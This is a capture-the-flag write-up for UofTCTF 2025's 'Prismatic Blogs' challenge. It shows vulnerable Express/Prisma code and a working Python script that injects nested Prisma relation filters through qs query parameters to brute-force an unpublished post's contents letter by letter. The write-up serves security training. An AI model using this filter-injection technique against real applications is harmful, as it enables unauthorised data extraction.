---
title: Prismatic Blogs
description: Here are API endpoints for a blog website.
categories: ["ctf", "UofTCTF 2025"]
tags: ["web"]
media_subpath: "/assets/posts/2025/uoftctf/prismatic-blogs"
---

We have a Node.js application that uses the Prisma ORM for SQLite:

```js
import express from "express";
import { PrismaClient } from "@prisma/client";

const app = express();
app.use(express.json())

const prisma = new PrismaClient();

const PORT = 3000;

app.get(
  "/api/posts",
  async (req, res) => {
    try {
      let query = req.query;
      query.published = true;
      console.log(query);
      let posts = await prisma.post.findMany({where: query});
      res.json({success: true, posts})
    } catch (error) {
      res.json({ success: false, error });
    }
  }
);

app.post(
    "/api/login",
    async (req, res) => {
        try {
            let {name, password} = req.body;
            let user = await prisma.user.findUnique({where:{
                    name: name
                },
                include:{
                    posts: true
                }
            });
            if (user.password === password) { 
                res.json({success: true, posts: user.posts});
            }
            else {
                res.json({success: false});
            }
        } catch (error) {
            res.json({success: false, error});
        }
    }
)

app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
```

The flag is in a non-`published` post, but we can only retrieve `published` ones.

We notice that the `where` field in the `findMany` call is user-controlled. Prisma uses this object
to filter the data it returns. There are many subfields available in the `where` field, including stuff related
to table relations. Let's take a look at the schema:

```
datasource db {
  provider = "sqlite"
  url      = "file:./database.db"
}

generator client {
  provider = "prisma-client-js"
}

model User {
  id        Int      @id @default(autoincrement())
  createdAt DateTime @default(now())
  name      String   @unique
  password  String
  posts     Post[]
}

model Post {
  id        Int      @id @default(autoincrement())
  createdAt DateTime @default(now())
  updatedAt DateTime @updatedAt
  published Boolean  @default(false)
  title     String   
  body      String
  author    User    @relation(fields: [authorId], references: [id])
  authorId  Int
}
```

Each author has many posts. Instead of filtering by `Post` columns, we can join the `User` table and use the columns from there.

Prisma has a nice [documentation](https://www.prisma.io/docs/orm/reference/prisma-client-reference#filter-conditions-and-operators).

Since we cannot overwrite the `published` property, we need to find another route. We can think it like this: find the posts whose author
has published posts whose body starts with a string. This filter will be joined with the `published: true` filter, so we won't get
the post back in the request. But we can bruteforce the post one letter at a time with the `startsWith` filter. If we got any post 
in the response, it means that the filter passed and we found a letter. At each iteration, we include the letters we found and bruteforce
the next one, and so on.

One more thing: the route uses the `GET` verb, so we can't pass the JSON directly. However, `express` uses `body-parser`,
which uses `qs`, which has an [interesting behavior](https://www.npmjs.com/package/qs#readme). We can nest fields and create
objects using the syntax `?a[b][c]=d`, which will be converted to `{ "a": { "b": { "c": "d" } } }`.

```py
import requests
import string

url = "http://localhost:3000"
url = "http://35.239.207.1:3000"
alphabet = string.ascii_lowercase + string.digits + "!#$&,@~}-_"

found = "This is a secret blog I am still working on. The secret keyword for this blog is uoftctf{"
while True:
    for letter in alphabet:
        response = requests.get(f"{url}/api/posts", params={
            "author[is][posts][some][body][startsWith]": found + letter
        })
        if len(response.json()["posts"]) > 0:
            if letter == "}":
                exit()
            found += letter
            print(found)
            break
    else:
        print("???")
        break
```

